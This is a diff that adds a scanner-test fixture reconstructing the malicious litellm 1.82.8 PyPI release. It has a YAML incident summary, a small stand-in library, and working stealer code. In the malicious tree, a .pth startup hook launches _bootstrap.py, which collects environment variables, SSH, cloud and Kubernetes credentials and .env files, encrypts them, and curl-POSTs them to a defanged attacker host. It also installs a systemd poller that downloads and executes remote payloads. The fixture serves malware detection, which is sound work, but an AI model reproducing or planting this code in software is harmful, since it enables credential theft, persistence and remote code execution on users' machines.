@@ -1,0 +1,235 @@
+# Defanged reconstruction of a real malicious package, for scanner tests.
+# Never run. See internal/e2e/livescan/corpus.go.
+id: litellm-1.82.8
+title: "litellm 1.82.8 (PyPI): .pth file runs a credential stealer at every interpreter start"
+campaign: teampcp-trivy-2026
+date: "2026-03-24"
+kind: wheel
+ecosystem: pip
+name: litellm
+version: "1.82.8"
+benignVersion: "1.82.6"
+summary: >-
+  On 2026-03-24 the TeamPCP actor published litellm 1.82.7 and 1.82.8 to PyPI
+  from the hijacked maintainer account (the project's own CI had run the
+  poisoned Trivy v0.69.4). 1.82.7 hid the payload in proxy_server.py, run on
+  import; 1.82.8 added litellm_init.pth, a one-line file at the site-packages
+  root that Python's site module executes at every interpreter start — pip
+  included — so the stealer ran even when litellm was never imported. It
+  collected environment variables, SSH keys, cloud and Kubernetes credentials
+  and .env files, encrypted them with a session key wrapped by an embedded RSA
+  key, exfiltrated the bundle, and installed a ~/.config systemd user poller
+  (sysmon.py) that fetched and ran further payloads from a C2. A bug — each
+  child reprocessed the .pth and forked again — is what got it noticed. The
+  Docker image was not affected.
+techniques: [account-takeover, pth-startup-execution, persistence-systemd, credential-theft, c2-poller]
+reconstruction: >-
+  litellm_init.pth is the single import line a .pth runs at startup, launching
+  _bootstrap.py detached. _bootstrap.py collects the environment and credential
+  files, encrypts them with openssl (session key + RSA-OAEP wrap, embedded
+  throwaway key), POSTs the bundle to a defanged host, and writes a systemd
+  user unit plus sysmon.py — the 300s-then-3000s poller that downloads a URL to
+  /tmp/pglog and runs it, skipping youtube.com, recording the last URL in
+  /tmp/.pg_state — all matching Kudelski's and StepSecurity's description. Every
+  endpoint (exfil host, C2) is defanged (".invalid"), and the payload is
+  readable rather than the original's double-base64 blob. The rest of litellm is
+  a small stand-in for the real library.
+references:
+  - https://docs.litellm.ai/blog/security-update-march-2026
+  - https://labs.boostsecurity.io/articles/teampcp-litellm-supply-chain-compromise/
+  - https://www.truesec.com/hub/blog/malicious-pypi-package-litellm-supply-chain-compromise
+  - https://futuresearch.ai/blog/litellm-pypi-supply-chain-attack/
+  - https://kudelskisecurity.com/research/investigating-two-variants-of-the-trivy-supply-chain-compromise
+indicators:
+  - litellm_init
+  - sysmon.py
+  - pglog
+-- shared/litellm/__init__.py --
+"""litellm: call 100+ LLM APIs using the OpenAI input/output format."""
+
+__version__ = "1.82.8"
+
+from litellm.main import completion, acompletion
+from litellm.utils import get_llm_provider, token_counter
+
+__all__ = ["completion", "acompletion", "get_llm_provider", "token_counter", "__version__"]
+-- shared/litellm/main.py --
+"""The completion entry points."""
+
+from litellm.utils import get_llm_provider
+
+
+def completion(model, messages, **kwargs):
+    """Route a chat completion to the provider that owns `model`."""
+    provider, model_name = get_llm_provider(model)
+    return {"provider": provider, "model": model_name, "choices": []}
+
+
+async def acompletion(model, messages, **kwargs):
+    """Async variant of completion()."""
+    return completion(model, messages, **kwargs)
+-- shared/litellm/utils.py --
+"""Small helpers shared across the package."""
+
+_PROVIDERS = {"gpt-": "openai", "claude-": "anthropic", "gemini-": "vertex_ai"}
+
+
+def get_llm_provider(model):
+    """Return (provider, model_name) for a model string."""
+    for prefix, provider in _PROVIDERS.items():
+        if model.startswith(prefix):
+            return provider, model
+    return "openai", model
+
+
+def token_counter(model="gpt-4o", text=""):
+    """A rough token estimate: about four characters per token."""
+    return max(1, len(text) // 4)
+-- shared/litellm/proxy/__init__.py --
+-- benign/litellm/proxy/proxy_server.py --
+"""The litellm proxy server (benign build)."""
+
+from litellm.main import completion
+
+
+def run_proxy(config_path=None, host="0.0.0.0", port=4000):
+    """Start the proxy server that fronts the configured providers."""
+    print(f"litellm proxy listening on {host}:{port}")
+    return {"host": host, "port": port, "config": config_path}
+-- malicious/litellm_init.pth --
+import os, sys, subprocess; subprocess.Popen([sys.executable, os.path.join(os.path.dirname(__file__), "litellm", "_bootstrap.py")], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True) if os.environ.get("LITELLM_NO_HOOK") != "1" else None
+-- malicious/litellm/proxy/proxy_server.py --
+"""The litellm proxy server."""
+
+from litellm.main import completion
+
+# Injected: also run the bootstrap on import, in case the .pth did not fire.
+try:
+    import litellm._bootstrap  # noqa: F401
+except Exception:
+    pass
+
+
+def run_proxy(config_path=None, host="0.0.0.0", port=4000):
+    """Start the proxy server that fronts the configured providers."""
+    print(f"litellm proxy listening on {host}:{port}")
+    return {"host": host, "port": port, "config": config_path}
+-- malicious/litellm/_bootstrap.py --
+"""Injected bootstrap: collect credentials, exfiltrate, and install a poller.
+
+Runs at every interpreter start via litellm_init.pth, and on import of
+litellm.proxy. Guarded by LITELLM_NO_HOOK so this reconstruction can be loaded
+without acting.
+"""
+
+import base64
+import os
+import subprocess
+import tempfile
+
+EXFIL_URL = "https://checkmarx.zone.invalid/upload"
+C2_URL = "https://checkmarx.zone.invalid/raw"
+
+# Embedded RSA public key (a throwaway, generated for this fixture).
+PUB_PEM = """-----BEGIN PUBLIC KEY-----
+MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAljJ/hwUQLOvkLumGeKH6
+eVIIcyCuEdXPA3xUyx9ckZLXcMso7yJKxRXGQW9bfqya5Y5RAcYeqHoQoYzHGoz8
+G0zxr3lJtevosmz7jrYP8L8CAwEAAQ==
+-----END PUBLIC KEY-----
+"""
+
+
+def _collect():
+    """Gather the environment and common credential files into one blob."""
+    parts = [f"{k}={v}" for k, v in os.environ.items()]
+    for path in [
+        os.path.expanduser("~/.ssh/id_rsa"),
+        os.path.expanduser("~/.aws/credentials"),
+        os.path.expanduser("~/.config/gcloud/application_default_credentials.json"),
+        os.path.expanduser("~/.kube/config"),
+        os.path.expanduser("~/.npmrc"),
+        os.path.join(os.getcwd(), ".env"),
+    ]:
+        try:
+            with open(path, "r", encoding="utf-8", errors="ignore") as fh:
+                parts.append(f"### {path}\n{fh.read()}")
+        except OSError:
+            continue
+    return "\n".join(parts).encode("utf-8", "ignore")
+
+
+def _encrypt_and_send(blob):
+    """Encrypt with a session key wrapped by the RSA key, then POST the bundle."""
+    work = tempfile.mkdtemp()
+    data = os.path.join(work, "payload")
+    with open(data, "wb") as fh:
+        fh.write(blob)
+    key = os.path.join(work, "session.key")
+    pub = os.path.join(work, "pub.pem")
+    with open(pub, "w") as fh:
+        fh.write(PUB_PEM)
+    subprocess.run(["openssl", "rand", "-out", key, "32"], check=False)
+    enc, key_enc = data + ".enc", key + ".enc"
+    subprocess.run(["openssl", "enc", "-aes-256-cbc", "-pbkdf2", "-in", data, "-out", enc, "-pass", f"file:{key}"], check=False)
+    subprocess.run(["openssl", "pkeyutl", "-encrypt", "-pubin", "-inkey", pub,
+                    "-pkeyopt", "rsa_padding_mode:oaep", "-in", key, "-out", key_enc], check=False)
+    bundle = os.path.join(work, "tpcp.tar.gz")
+    subprocess.run(["tar", "-czf", bundle, "-C", work, "payload.enc", "session.key.enc"], check=False)
+    subprocess.run(["curl", "-s", "-X", "POST", "-H", "Content-Type: application/octet-stream",
+                    "--data-binary", f"@{bundle}", EXFIL_URL], check=False)
+
+
+def _install_poller():
+    """Write a systemd user unit and sysmon.py that polls the C2 for payloads."""
+    cfg = os.path.expanduser("~/.config/systemd/user")
+    os.makedirs(cfg, exist_ok=True)
+    sysmon = os.path.join(os.path.dirname(cfg), "sysmon.py")
+    with open(sysmon, "w") as fh:
+        fh.write(
+            "import time, subprocess, urllib.request\n"
+            f"C_URL = {C2_URL!r}\n"
+            "STATE, TARGET = '/tmp/.pg_state', '/tmp/pglog'\n"
+            "def g():\n"
+            "    return urllib.request.urlopen(C_URL, timeout=30).read().decode('utf-8', 'ignore').strip()\n"
+            "def e(url):\n"
+            "    if 'youtube.com' in url:\n"
+            "        return\n"
+            "    data = urllib.request.urlopen(url, timeout=60).read()\n"
+            "    open(TARGET, 'wb').write(data)\n"
+            "    import os\n"
+            "    os.chmod(TARGET, 0o755)\n"
+            "    subprocess.Popen([TARGET], start_new_session=True)\n"
+            "    open(STATE, 'w').write(url)\n"
+            "time.sleep(300)\n"
+            "while True:\n"
+            "    try:\n"
+            "        e(g())\n"
+            "    except Exception:\n"
+            "        pass\n"
+            "    time.sleep(3000)\n"
+        )
+    with open(os.path.join(cfg, "sysmon.service"), "w") as fh:
+        fh.write("[Unit]\nDescription=System Monitor\n[Service]\n"
+                 f"ExecStart=%h/.config/sysmon.py\nRestart=always\n[Install]\nWantedBy=default.target\n")
+
+
+def main():
+    if os.environ.get("LITELLM_NO_HOOK") == "1":
+        return
+    try:
+        _encrypt_and_send(_collect())
+        _install_poller()
+    except Exception:
+        pass
+
+
+main()
+-- malicious/litellm/__init__.py --
+"""litellm: call 100+ LLM APIs using the OpenAI input/output format."""
+
+__version__ = "1.82.8"
+
+from litellm.main import completion, acompletion
+from litellm.utils import get_llm_provider, token_counter
+
+__all__ = ["completion", "acompletion", "get_llm_provider", "token_counter", "__version__"]
